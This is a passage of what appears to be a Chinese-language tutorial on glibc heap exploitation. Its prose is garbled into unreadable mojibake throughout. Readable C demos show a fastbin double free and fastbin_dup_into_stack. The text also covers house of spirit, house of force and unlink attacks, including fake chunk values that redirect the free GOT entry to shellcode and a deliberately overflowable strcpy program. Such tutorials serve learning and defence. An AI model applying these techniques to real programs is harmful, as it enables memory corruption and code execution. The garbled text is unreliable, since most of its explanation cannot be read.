ä¼šä»¥å•å‘é“¾è¡¨çš„å½¢å¼å›æ”¶åˆ°fastbin é‡Œé¢ï¼Œç„¶åé€šè¿‡ fastbin->fd æ¥éå†ã€‚ç”±äº free çš„è¿‡ç¨‹ä¼šå¯¹ free list åšæ£€æŸ¥ï¼Œæˆ‘ä»¬ä¸èƒ½è¿ç»­ä¸¤æ¬¡ free åŒä¸€ä¸ª chunkï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ä¸¤æ¬¡ free ä¹‹é—´ï¼Œå¢åŠ äº†ä¸€æ¬¡å¯¹å…¶ä»– chunk çš„ free è¿‡ç¨‹ï¼Œä»è€Œç»•è¿‡äº†æ£€æŸ¥é¡ºåˆ©æ‰§è¡Œï¼Œç„¶åå† malloc ä¸‰æ¬¡ï¼Œå°±åœ¨åŒä¸€ä¸ªåœ°å€ malloc äº†ä¸¤æ¬¡ï¼Œä¹Ÿå°±æœ‰äº†ä¸¤ä¸ªæŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸçš„æŒ‡é’ˆã€‚\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *d = malloc(9);\n    char *e = malloc(9);\n    char *f = malloc(9);\n    strcpy(d, \"DDDDDDDD\");\n    fprintf(stderr, \"4st malloc(9) %p points to %s the first time\\n\", d, d);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s the second time\\n\", f, f);\n}\n```\n\nç¨‹åºfree(a)äº†ä¸¤æ¬¡ï¼Œå¯ä»¥ä¸€æ­¥ä¸€æ­¥è°ƒè¯•chunkçš„æƒ…å†µï¼Œ\n\nä¸‰æ¬¡mallocä¹‹å\n\n![](https://i.loli.net/2020/07/23/M9V4kXQqRULDdnA.png)\n\nfree(a)ä¹‹åï¼Œå¯ä»¥çœ‹åˆ°aè¢«åŠ åˆ°äº†fastbinä¸­\n\n![](https://i.loli.net/2020/07/23/7InVkBHpStOg4Nz.png)\n\n![](https://i.loli.net/2020/07/23/EYlCgqmK4Qud8FX.png)\n\nfree(b)ä¹‹å,å¯ä»¥çœ‹åˆ°bä¹Ÿè¢«åŠ åˆ°fastbinä¸­ï¼Œå¹¶ä¸”fdæŒ‡é’ˆæŒ‡å‘äº†açš„åœ°å€\n\n![](https://i.loli.net/2020/07/23/XMowxTDZ7PsiAq3.png)\n\n![](https://i.loli.net/2020/07/23/P6e2dSHTAkmLpvX.png)\n\nå†æ¬¡free(a)ä¹‹åï¼Œa->fdåˆæŒ‡å‘äº†bï¼Œä¹Ÿå°±æ˜¯è¯´aå†ä¸€æ¬¡è¢«æ·»åŠ åˆ°fastbinï¼ŒåŒæ—¶b->fd=aï¼Œæ‰€ä»¥å®é™…ä¸Šå½¢æˆäº†ä¸€ä¸ªç¯ã€‚\n\n![](https://i.loli.net/2020/07/23/gErzHZUPC8Kt5nY.png)\n\næœ€åä¸‰æ¬¡mallocä¹‹å,å‘ç°0x44(â€˜Dâ€™)ä¸è§äº†ï¼Œå…¶å®æ˜¯ç¬¬äºŒæ¬¡malloc açš„æ—¶å€™0x46å°†å…¶è¦†ç›–äº†ã€‚è¿™å°±æ˜¯double freeçš„åŸºæœ¬åŸç†ï¼Œä½†å¯ä»¥æƒ³è±¡ï¼Œå¦‚æœç¬¬ä¸€æ¬¡ç”³è¯·açš„æ—¶å€™ï¼Œå°†fdæŒ‡é’ˆä¿®æ”¹æˆæœ‰æ„ä¹‰çš„åœ°å€ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åšåˆ°ä»»æ„åœ°å€å†™(å¯ä»¥ç»“åˆå †æº¢å‡º)ã€‚\n\n![](https://i.loli.net/2020/07/23/PIeNXDMBSHuAEaw.png)\n\nåœ¨ libc-2.26 ä¹‹åï¼Œå³ä½¿ä¸¤æ¬¡ freeï¼Œä¹Ÿæ²¡æœ‰è§¦å‘ double-free çš„å¼‚å¸¸æ£€æµ‹ï¼Œè¿™æ˜¯å› ä¸º tcache çš„æœºåˆ¶æœ‰å…³ï¼Œæ°´å¹³æœ‰é™ï¼Œè¿™é‡Œæš‚ä¸æ¢è®¨ã€‚\n\n------\n\n# 0x03 å †æº¢å‡ºæ¼æ´åˆ©ç”¨\n\n### 1. House of spirit(fastbin)\n\n**åˆ©ç”¨æŠ€æœ¯:**\n\n> (1) fastbin ä¸ºå•é“¾è¡¨(åªç”¨åˆ°fd)ï¼Œç»“æ„ç®€å•ï¼Œå®¹æ˜“ä¼ªé€ \n>(2) ä¸ºäº†æé«˜åˆ†é…æ•ˆç‡ï¼Œå®‰å…¨æ£€æŸ¥å°‘\n> (3) åªé’ˆå¯¹fastbinå¤§å°çš„chunkï¼Œsmall/large chunkä¸é€‚ç”¨\n>(4) å­˜åœ¨å †æº¢å‡ºã€use-after-free ç­‰èƒ½æ§åˆ¶ chunk å†…å®¹çš„æ¼æ´\n\n**åˆ©ç”¨æ€è·¯:**\n\n1. ç©ºé—²fast chunkå¦‚æœå‘ç”Ÿæº¢å‡ºè¢«è¦†ç›–ï¼Œåˆ™é“¾è¡¨æŒ‡é’ˆfdå¯ä»¥è¢«ä¿®æ”¹\n\n2. é€šè¿‡ä¿®æ”¹é“¾è¡¨æŒ‡é’ˆfdï¼Œåœ¨fastbinä¸­å¼•å…¥ä¼ªé€ çš„free chunk(æœ€é‡è¦çš„æ˜¯å¿…é¡»ä¿è¯ä¼ªé€ çš„chunkç»“æ„åˆæ³•)\n\n3. ä¸‹æ¬¡åˆ†é…æ—¶åˆ†é…ä¼ªé€ çš„fast chunk\n\n4. ä¼ªé€ çš„fast chunkå¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®ï¼š\n\nåœ¨æ ˆä¸Šä¼ªé€ fast chunkï¼šè¦†ç›–è¿”å›åœ°å€\nåœ¨bssä¸Šä¼ªé€ fast chunkï¼šä¿®æ”¹å…¨å±€å˜é‡\nåœ¨å †ä¸Šä¼ªé€ fast chunkï¼šä¿®æ”¹å †ä¸Šæ•°æ®\n\nä»¥fastbin_dup_into_stackä¸ºä¾‹ï¼Œè¯¥ç¨‹åºä¾¿æ˜¯åˆ©ç”¨double freeè¿›è¡Œfastbin attackå…¶ä½™ä¸¤ç§å¯ç±»æ¯”è¯¥ä¾‹å­\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nint main() {\n    unsigned long long stack_var = 0x21;\n    fprintf(stderr, \"Allocating 3 buffers.\\n\");\n    char *a = malloc(9);\n    char *b = malloc(9);\n    char *c = malloc(9);\n    strcpy(a, \"AAAAAAAA\");\n    strcpy(b, \"BBBBBBBB\");\n    strcpy(c, \"CCCCCCCC\");\n    fprintf(stderr, \"1st malloc(9) %p points to %s\\n\", a, a);\n    fprintf(stderr, \"2nd malloc(9) %p points to %s\\n\", b, b);\n    fprintf(stderr, \"3rd malloc(9) %p points to %s\\n\", c, c);\n\n    fprintf(stderr, \"Freeing the first one %p.\\n\", a);\n    free(a);\n    fprintf(stderr, \"Then freeing another one %p.\\n\", b);\n    free(b);\n    fprintf(stderr, \"Freeing the first one %p again.\\n\", a);\n    free(a);\n\n    fprintf(stderr, \"Allocating 4 buffers.\\n\");\n    unsigned long long *d = malloc(9);\n    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));\n    fprintf(stderr, \"4nd malloc(9) %p points to %p\\n\", d, &d);\n    char *e = malloc(9);\n    strcpy(e, \"EEEEEEEE\");\n    fprintf(stderr, \"5nd malloc(9) %p points to %s\\n\", e, e);\n    char *f = malloc(9);\n    strcpy(f, \"FFFFFFFF\");\n    fprintf(stderr, \"6rd malloc(9) %p points to %s\\n\", f, f);\n    char *g = malloc(9);\n    strcpy(g, \"GGGGGGGG\");\n    fprintf(stderr, \"7th malloc(9) %p points to %s\\n\", g, g);\n}\n```\n\nè¿™ä¸ªç¨‹åºå±•ç¤ºäº†æ€æ ·é€šè¿‡ä¿®æ”¹æŒ‡é’ˆï¼Œå°†å…¶æŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„ free chunkï¼Œåœ¨ä¼ªé€ çš„åœ°å€å¤„ malloc å‡ºä¸€ä¸ª chunkã€‚Double freeä¹‹å‰çš„ç¨‹åºåŸºæœ¬æ²¡å˜ï¼Œå…³é”®ç‚¹åœ¨äºæˆ‘ä»¬çš„ä¸‹ä¸€æ¬¡mallocï¼š\n\n```c\nunsigned long long *d = malloc(9);\n*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));\n```\n\nå¡«å……äº†ä¸€ä¸ªåœ°å€ï¼šæ ˆåœ°å€-0x8\n\n  è¿™ä¸€æ­¥çš„æ„ä¹‰å°±æ˜¯åœ¨äºåœ¨æ ˆä¸Šæ„é€ äº†ä¸€ä¸ªåˆæ³•chunkï¼Œä¼ªé€ çš„chunkè¦æœ‰åˆæ³•çš„å †å¤´ä¿¡æ¯ï¼Œæ‰€ä»¥åº”ä»sizeåŸŸ-0x8å¼€å§‹ã€‚\n\nç‰¹åˆ«è¦æ³¨æ„çš„æ˜¯ï¼Œfake fastbinä¸­çš„sizeéœ€è¦ä¸æ”¹å†™æŒ‡é’ˆçš„fastbinå—å¤§å°ä¸€è‡´ï¼Œä¸”pä½ä¸º1ã€‚\n\nå¯ä»¥çœ‹ä¸€ä¸‹æ ˆä¸­çš„ä½ç½®\n\n![1590283439038-3681fb04-725f-4a4e-ae8a-cd6f17aa0b82](https://s2.loli.net/2022/01/27/1KCrU8tOBzqPJVy.png)\n\nè€Œåœ¨fastbinä¸­ï¼ŒåŸæœ¬çš„aå †å—fdæŒ‡é’ˆå·²ç»æ”¹ä¸ºæ ˆä¸­å¯¹åº”çš„åœ°å€ï¼Œå› æ­¤å½“ä¸‹ä¸€æ¬¡malloc aæ—¶ï¼Œå°±ä¼šåœ¨æˆ‘ä»¬ä¼ªé€ çš„å‡chunkåˆ†é…å†…å­˜ã€‚\n\n![1590284609774-10ac80a9-eab4-4ed0-8cd5-86cd1adab978](https://s2.loli.net/2022/01/27/OSb7euGK2EHxFor.png)\n\nå¦‚æœèƒ½å®ç°åœ¨æ ˆä¸­çš„ä»»æ„åœ°å€å†™ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç”¨æ ˆçš„æ–¹æ³•è·å–shellã€‚\n\nåŒæ ·ï¼Œå¦‚æœå­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œä¹Ÿå¯ä»¥è¿›è¡Œfree chunk fdæŒ‡é’ˆçš„ä¿®æ”¹ï¼Œä½†æ˜¯ä¸ºäº†æ€»ç»“ç›¸å…³åŸç†å’Œä¾¿äºç†è§£ï¼Œæˆ‘ä¸¾çš„ä¾‹å­éƒ½å¾ˆç®€å•ï¼Œä»…é€‚åˆå…¥é—¨è€…å­¦ä¹ å‚è€ƒã€‚\n\n------\n\n### 2. house of force\n\n**åˆ©ç”¨æ¡ä»¶ï¼š**\n\n1.èƒ½å¤Ÿä»¥æº¢å‡ºçš„æ–¹å¼æ§åˆ¶åˆ°top chunkçš„sizeåŸŸ\n\n2.èƒ½å¤Ÿè‡ªç”±åœ°æ§åˆ¶å †åˆ†é…å°ºå¯¸çš„å¤§å°\n\n3.å¯ä»¥æ„é€ sizeæ‹¿åˆ°top chunkæœ¬èº«ä¹‹å¤–çš„å†…å­˜ï¼Œå¦‚libcçš„å†…å­˜ç©ºé—´\n\nè¿™ç§æ–¹æ³•ä¸»è¦æ˜¯æŒ‡å †å—æº¢å‡ºè¦†ç›–top chunkä¸­çš„sizeåŸŸçš„æƒ…å†µï¼Œé€šè¿‡å°†å…¶ä¿®æ”¹ä¸ºä¸€ä¸ªéå¸¸å¤§çš„æ•°æ®ï¼Œä»è€Œå¯ä»¥ç”³è¯·éå¸¸å¤§çš„ç©ºé—´ï¼Œä½¿å¾—æ–°top chunkçš„å¤´éƒ¨è½åˆ°æƒ³è¦ä¿®æ”¹çš„ä½ç½®ã€‚åœ¨ä¸‹æ¬¡ç”³è¯·æ—¶ï¼Œå°±èƒ½å¤Ÿå¾—åˆ°ç›®æ ‡å†…å­˜ï¼Œä»è€Œå®ç°æ³„éœ²å’Œæ”¹å†™ã€‚\n\n**åˆ©ç”¨æ­¥éª¤å¦‚ä¸‹ï¼š**\n\n(1)é¦–å…ˆå…ˆæ³„éœ²å‡ºå †åœ°å€ã€‚\n\n(2)åˆ©ç”¨å †æº¢å‡ºï¼Œå°†top chunkçš„sizeåŸŸä¿®æ”¹ä¸ºå¾ˆå¤§çš„æ•°\n\n(3)ç”³è¯·å¤§å—å†…å­˜(å¯ä»¥é€šè¿‡å †åœ°å€å’Œç›®æ ‡åœ°å€çš„è·ç¦»è¿›è¡Œè®¡ç®—)ï¼Œä½¿å¾—top chunkçš„å¤´éƒ¨è½åœ¨ç›®æ ‡åœ°å€èŒƒå›´å†…ã€‚\n\n(4)å†æ¬¡ç”³è¯·å†…å­˜ï¼Œé‚£ä¹ˆæ–°ç”³è¯·çš„å†…å­˜å³ä¸ºç›®æ ‡åœ°å€ï¼Œé€šå¸¸æƒ…å†µä¸‹(æœªå¼€å¯FullRelro)ï¼Œä¸€èˆ¬æ˜¯å°†ç›®æ ‡åœ°å€è®¾ä¸ºgotè¡¨åœ°å€ã€‚\n\n![](https://i.loli.net/2020/07/23/URVaO8tr3z6buBf.png)\n\nå½“æˆ‘ä»¬è®¡ç®—å¥½å½“å‰å †å—ä¸ç›®æ ‡åœ°å€ä¹‹é—´çš„åç§»åï¼Œç”³è¯·è¯¥å¤§å°çš„å †å—ï¼Œè®©chunkå¤´ä¼šæ°å¥½è½åœ¨ç›®æ ‡åœ°å€å‰(ä½åœ°å€)ï¼Œè¿™æ—¶å†æ¬¡ç”³è¯·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¹å†™ç›®æ ‡åœ°å€å†…å®¹ã€‚\n\n------\n\n### 3.unlink(æ—§ç‰ˆ)\n\nunlinkæ”»å‡»æŠ€æœ¯æ˜¯åˆ©ç”¨glibc mallocçš„å†…å­˜å›æ”¶æœºåˆ¶ï¼Œé€šè¿‡å †æº¢å‡ºç­‰æ–¹æ³•è¿›è¡Œå†…å­˜ä¿®æ”¹ã€‚\n\nè¦æƒ³åˆ©ç”¨unlinkï¼Œé¦–å…ˆè¦äº†è§£free()çš„å·¥ä½œè¿‡ç¨‹ï¼š\n\n> (1)å¦‚æœsize<max fastï¼Œæ”¾å…¥fastbinï¼Œç»“æŸ\n>(2)å¦‚æœå‰ä¸€ä¸ªchunkæ˜¯freeçš„ï¼Œunlinkå‰é¢çš„chunkï¼Œåˆå¹¶ä¸¤ä¸ªchunkï¼Œå¹¶æ”¾å…¥unsorted bin\n> (3)å¦‚æœåä¸€ä¸ªchunkæ˜¯freeçš„ï¼Œåˆ™unlinkåé¢çš„chunkï¼Œåˆå¹¶ä¸¤ä¸ªchunkï¼Œå¹¶æ”¾å…¥unsorted bin\n>(4)å¦‚æœåä¸€ä¸ªæ˜¯top chunkï¼Œåˆ™å°†å½“å‰chunkå¹¶å…¥top chunk\n> (5)å‰åchunkéƒ½ä¸æ˜¯freeçš„ï¼Œåˆ™ç›´æ¥æ”¾å…¥unsorted bin\n\nç›¸å…³ä»£ç å¦‚ä¸‹:\n\n![image-20200723164353967](https://i.loli.net/2020/07/23/JgR9imeK6YMQ2rZ.png)\n\næµç¨‹å¤§ä½“æ˜¯è¿™æ ·çš„ï¼š\n\n(1)å°†å‰ä¸€ä¸ªchunkå ç”¨çš„å†…å­˜åˆå¹¶åˆ°å½“å‰chunk;\n(2)ä¿®æ”¹æŒ‡å‘å½“å‰chunkçš„æŒ‡é’ˆï¼Œæ”¹ä¸ºæŒ‡å‘å‰ä¸€ä¸ªchunkã€‚\n(3)ä½¿ç”¨unlinkå®ï¼Œå°†å‰ä¸€ä¸ªfree chunkä»åŒå‘å¾ªç¯é“¾è¡¨ä¸­ç§»é™¤\n\nå‘å‰åˆå¹¶å’Œå‘ååˆå¹¶è¿‡ç¨‹ç±»ä¼¼ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚äº†è§£äº†unlinkçš„åŸºæœ¬åŸç†ä¹‹åï¼Œå¯ä»¥ç»“åˆä¾‹å­ç†è§£\n\nå­˜åœ¨unlinkæ”»å‡»æ¼æ´çš„ç¨‹åºå¦‚ä¸‹\n\n```c\n#include <stdlib.h>\n#include <string.h> \n\nint main( int argc, char * argv[] )\n{\nchar * first, * second; \n\nfirst = malloc( 666 );\nsecond = malloc( 12 );\n  if(argc!=1)\n     strcpy( first, argv[1] );\n\nfree( first );\nfree( second );\nreturn( 0 );\n}\n```\n\nè¯¥ç¨‹åºå­˜åœ¨ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼šå¦‚æœç”¨æˆ·è¾“å…¥çš„argv1çš„å¤§å°æ¯”firstå˜é‡çš„666å­—èŠ‚æ›´å¤§çš„è¯ï¼Œé‚£ä¹ˆè¾“å…¥çš„æ•°æ®å°±æœ‰å¯èƒ½è¦†ç›–æ‰ä¸‹ä¸€ä¸ªchunkçš„chunk headerâ€”â€”è¿™å¯ä»¥å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚è€Œæ”»å‡»çš„æ ¸å¿ƒæ€è·¯å°±æ˜¯åˆ©ç”¨glibc mallocçš„unlinkæœºåˆ¶ã€‚\n\nç°åœ¨æˆ‘ä»¬å†æ¥åˆ†æå¦‚æœä¸€ä¸ªæ”»å‡»è€…ç²¾å¿ƒæ„é€ è¾“å…¥æ•°æ®å¹¶é€šè¿‡strcpyè¦†ç›–äº†second chunkçš„chunk headeråä¼šå‘ç”Ÿä»€ä¹ˆæƒ…å†µã€‚ \n\nå‡è®¾è¢«è¦†ç›–åçš„chunk headerç›¸å…³æ•°æ®å¦‚ä¸‹ï¼š \n\n \n\n> (1) å¡«å……prev_sizeä½ä¸ºä¸€ä¸ªå¶æ•°\n>\n> (2) size = -4 (64ä½ä¸‹ä¸º-8) \n>\n> (3) fd = free å‡½æ•°çš„gotè¡¨åœ°å€address â€“ 12ï¼› \n>\n> (4) bk = shellcodeçš„åœ°å€ \n\né‚£ä¹ˆå½“ç¨‹åºè°ƒç”¨free(first)åä¼šå‘ç”Ÿä»€ä¹ˆå‘¢ï¼Ÿ\n\næˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥åˆ†æï¼Œå‰é¢å·²ç»ä»‹ç»è¿‡äº†freeçš„æµç¨‹ï¼Œç”±äºfirstå‰é¢æ— freeçš„chunkï¼Œæ‰€ä»¥ä¸ä¼šå‘ç”Ÿå‘ååˆå¹¶ï¼Œå› æ­¤æ¥åˆ¤æ–­ä¸‹é¢æ˜¯å‘å‰åˆå¹¶ï¼Œä»£ç å¦‚ä¸‹ï¼š\n\n![image-20200723164646772](https://i.loli.net/2020/07/23/kh4bnoClPHOEZRT.png)\n\næœ¬ä¾‹ä¸­ï¼Œnext chunkå°±æ˜¯second chunkï¼Œä»ä¸Šé¢ä»£ç å¯çŸ¥chunkåˆ¤æ–­ä¸‹ä¸€å †å—æ˜¯å¦freeçš„æ–¹æ³•ï¼Œå³é€šè¿‡nextchunk + nextsizeè®¡ç®—å¾—åˆ°æŒ‡å‘ä¸‹ä¸‹ä¸€ä¸ªchunkçš„æŒ‡é’ˆï¼Œç„¶ååˆ¤æ–­ä¸‹ä¸‹ä¸ªchunkçš„sizeçš„PREV_INUSEæ ‡è®°ä½æ˜¯å¦ä¸º0ã€‚\n\nåœ¨æœ¬ä¾‹ä¸­ï¼Œæ­¤æ—¶nextsizeè¢«æˆ‘ä»¬è®¾ç½®ä¸ºäº†-4ï¼Œè¿™æ ·glibc mallocå°±ä¼šå°†next chunkçš„prev_sizeå­—æ®µçœ‹åšæ˜¯next-next chunkçš„sizeå­—æ®µï¼Œè€Œæˆ‘ä»¬å·²ç»å°†next chunkçš„prev_sizeå­—æ®µè®¾ç½®ä¸ºäº†ä¸€ä¸ªå¶æ•°ï¼Œå› æ­¤æ­¤æ—¶é€šè¿‡inuse_bit_at_offsetå®è·å–åˆ°çš„nextinuseä¸º0ï¼Œå³next chunkä¸ºfreeï¼\n\næ—¢ç„¶next chunkä¸ºfreeï¼Œé‚£ä¹ˆå°±éœ€è¦è¿›è¡Œå‘å‰åˆå¹¶ï¼Œæ‰€ä»¥å°±ä¼šè°ƒç”¨unlink(nextchunk, bck, fwd)å‡½æ•°ã€‚\n\nçœŸæ­£çš„é‡ç‚¹å°±æ˜¯è¿™ä¸ªunlinkå‡½æ•°çš„åˆ©ç”¨ï¼Œè®¤çœŸåˆ†æä¸€ä¸‹unlinkçš„ä»£ç \n\n![](https://i.loli.net/2020/07/23/EHrP51xWJX7fKR2.png)\n\næ‰“çœ¼ä¸€çœ‹ï¼Œå¾ˆåƒæ•°æ®ç»“æ„ä¸­å­¦è¿‡çš„åˆ é™¤é“¾è¡¨ä¸­æŸä¸€ç»“ç‚¹çš„æ“ä½œï¼Œç¡®å®å¦‚æ­¤ï¼Œunlinkå®ç°çš„åŠŸèƒ½æ­£æ˜¯åœ¨binsé“¾è¡¨ä¸­åˆ é™¤æ‰å·²ç»è¢«åˆå¹¶çš„å—ã€‚\n\nå…·ä½“åˆ©ç”¨æµç¨‹å¦‚ä¸‹ï¼š\n\n> (1) é¦–å…ˆFD = nextchunk->fd = freeåœ°å€ â€“ 12; \n>(2) ç„¶åBK = nextchunk->bk = shellcodeèµ·å§‹åœ°å€ï¼›\n> (3) å†å°†BKèµ‹å€¼ç»™FD->bkï¼Œå³ï¼ˆfreeåœ°å€ â€“ 12ï¼‰->bk = shellcodeèµ·å§‹åœ°å€ï¼› \n>(4) æœ€åå°†FDèµ‹å€¼ç»™BK->fdï¼Œå³(shellcodeèµ·å§‹åœ°å€)->fd = freeåœ°å€ â€“ 12ã€‚\n\nä½œå›¾ç†è§£ä¸€ä¸‹ï¼š\n\n![image-20200723165236574](https://i.loli.net/2020/07/23/BTQOKLG2XSyHqge.png)\n\nç»“åˆå›¾ç‰‡åº”è¯¥å¾ˆå¥½ç†è§£ï¼Œå€ŸåŠ©äº†unlinkå°†free()çš„gotè¡¨ä¿®æ”¹ä¸ºshellcodeåœ°å€ï¼Œå½“å†æ¬¡free(second)æ—¶ï¼Œå°±ä¼šè½¬è€Œè¿è¡Œæˆ‘ä»¬å†™å¥½çš„shellcodeäº†ã€‚\n\nè¿™é‡Œçš„chunkå¤´å¹¶ä¸æ˜¯çœŸå®çš„ï¼Œåªæ˜¯æˆ‘ä»¬åœ¨æ”»å‡»ä¸­éœ€è¦è®©glic mallocåœ¨è¿›è¡Œunlinkæ—¶å°†å®ƒä»¬å¼ºåˆ¶çœ‹ä½œchunkç»“æ„ä½“è€Œä¼ªé€ çš„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢è¯´çš„ç»“æ„åˆæ³•ã€‚\n\n------\n\n### 4.unlink (freenote)\n\nä¸Šé¢Unlinkçš„æ–¹æ³•æœ‰äº›è¿‡æ—¶ï¼Œä½†æ˜¯å¯ä»¥æ‹¿è¿‡æ¥å­¦ä¹ ä¸€ä¸‹åŸç†ï¼Œæœ‰åŠ©äºå¯¹å †æœ‰æ›´å¥½çš„ç†è§£ï¼Œç›®å‰æ–°å¼çš„unlinkä¸­åŠ å…¥äº†è®¸å¤šé™åˆ¶ï¼Œå…¶ä¸­æœ€é‡è¦çš„ä¸€æ¡æ˜¯ï¼š\n\n`FD->bk !=p || BK->fd !=p; `\n\nä¹Ÿå°±æ˜¯è¯´ç”±äºæœ‰ä¸€ä¸ªä¿æŠ¤æ£€æŸ¥æœºåˆ¶ï¼Œå®ƒä¼šæ£€æŸ¥è¿™ä¸ª chunk çš„å‰ä¸€ä¸ª chunk çš„ bk æŒ‡é’ˆæ˜¯ä¸æ˜¯æŒ‡å‘è¿™ä¸ª chunkï¼ˆåä¸€ä¸ªä¹Ÿä¸€æ ·ï¼‰ï¼Œç›´æ¥å¯¼è‡´å¾ˆå¤šåˆ©ç”¨æ–¹å¼éš¾ä»¥æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œæ¯”è¾ƒæœ‰æ•ˆçš„æ˜¯freenoteçš„æ–¹å¼ã€‚\n\nä¸‹é¢ä»‹ç»freenoteçš„ä¸»è¦åˆ©ç”¨æ€è·¯ã€‚\n\nFree chunk çš„åŒé“¾è¡¨ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n`FD = p->fd = *(&p + 2)`\n`BK = p->bk = *(&p + 3)`\n\nä½†ç°åœ¨æ‰§è¡Œunlink(P,BK,FD)æ—¶ï¼Œéœ€è¦æ»¡è¶³FD->bk = p && BK->fd = pçš„æ¡ä»¶ï¼Œå³ï¼š\n\n`FD->bk = *(*(&p + 2) + 3 ) = *(p[2] + 3) == p `\n `BK->fd = *(*(&p + 3) + 2 ) = *(p[3] + 2) == p `\n=>\n`p[2] = &p â€“ 3, p[3] = &p â€“ 2 `\n\nè¿™é‡Œæ¯”è¾ƒç»•ï¼Œå»ºè®®ç”»å›¾è¾…åŠ©ç†è§£ã€‚\n\nè¿™æ—¶å¦‚æœå­˜åœ¨ä¸€ä¸ªå…¨å±€å˜é‡G_Pï¼Œå…¶ä¸­å­˜å‚¨çš„æŒ‡é’ˆæŒ‡å‘pçš„è¯ï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡è®¾ç½®p[2] = &p â€“ 3, p[3] = &p â€“ 2 è¿›è¡Œä¼ªé€ ï¼Œæ¥æ»¡è¶³æŒ‡é’ˆæ£€æŸ¥ã€‚\n\n![](https://i.loli.net/2020/07/23/vLMebO9hn6pTHP4.png)\n\næ ¹æ®å›¾æ‰€ç¤ºï¼Œå½“æ„é€ çš„fake chunkæº¢å‡ºä¿®æ”¹äº†ä¸‹ä¸€ä¸ªchunkçš„ prev_sizeå’Œpä½ï¼Œå°±å¯ä»¥å°†fake chunk ä¼ªé€ æˆfree chunkï¼Œè¿™æ—¶freeæ‰ä¸‹ä¸€ä¸ªchunkï¼Œä¸¤ä¸ªå—ä¾¿å¯åˆå¹¶ï¼Œè§¦å‘unlinkã€‚\n\n> FD = P->fd \n>BK = P->bk \n> FD->bk = BK\n>BK->fd = FD\n\n![1593172846524-c2fc14af-bf0c-44db-8c3d-d2b26e5ea2c5](https://s2.loli.net/2022/01/27/DhwBNx1VLH9i3FZ.png)\n\næœ€ç»ˆæ‰§è¡Œ:\n\n> FD->bk = BK; =>p = *(&p+3) = p[3] = &p-2\n>BK->fd = FD; =>p = *(&p+2) = p[2] = &p-3\n\nä½¿å¾—ï¼š\n`p= &p â€“ 3`\n\næœ€åï¼ŒpæŒ‡é’ˆæŒ‡å‘å…¨å±€å˜é‡G_På‰é¢3ä¸ª4(8å­—èŠ‚)å­—èŠ‚å¤„ã€‚å¦‚æœG_Pæ˜¯ä¸ªç®¡ç†ç»“æ„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ä»»æ„åœ°å€è¯»å†™äº†ã€‚å³å¯ä»¥é€šè¿‡ä¿®æ”¹pæ‰€æŒ‡å‘çš„å†…å®¹æ¥ä¿®æ”¹pçš„æŒ‡é’ˆäº†\n\néœ€è¦æ»¡è¶³å¦‚ä¸‹æ¡ä»¶ï¼š\n\n1. å­˜åœ¨å †è¦†ç›–ï¼Œå¯ä»¥æ”¹å†™åˆ°å³å°†è¦é‡Šæ”¾çš„å †å—ï¼Œå°†å…¶prev_sizeæ”¹æˆæ‰€æ„é€ çš„å †å—å¤§å°ï¼Œsizeä¸­pä½æ”¹ä¸º0.\n2. å­˜åœ¨å·²çŸ¥åœ°å€çš„æŒ‡é’ˆ(é€šå¸¸ä¸ºå…¨å±€å˜é‡)æŒ‡å‘ä¼ªé€ çš„å †å—å¤´éƒ¨ã€‚\n\n3. èƒ½å¤Ÿé‡Šæ”¾åç»­å †å—æ¥è§¦å‘unlinkã€‚\n\n------\n\n### 5.forgotten chunk\n\nforgotten chunkä¸»è¦æ˜¯æŒ‡chunkçš„ç”³è¯·é‡Šæ”¾ä¸­è¢«é—å¿˜çš„éƒ¨åˆ†ï¼Œè™½ç„¶å †å—çš„ç”³è¯·å’Œé‡Šæ”¾é€»è¾‘ç›¸å¯¹æ¥è¯´æ¯”è¾ƒå®Œå–„ï¼Œä½†æ˜¯æ£€æŸ¥è¿˜æ˜¯å­˜åœ¨æ¼æ´ã€‚\n\nç®€å•çš„æƒ…å†µæ˜¯ä»å‰å¾€åé‡Šæ”¾ï¼Œæ„é€ å‡ºæ®‹ç•™å 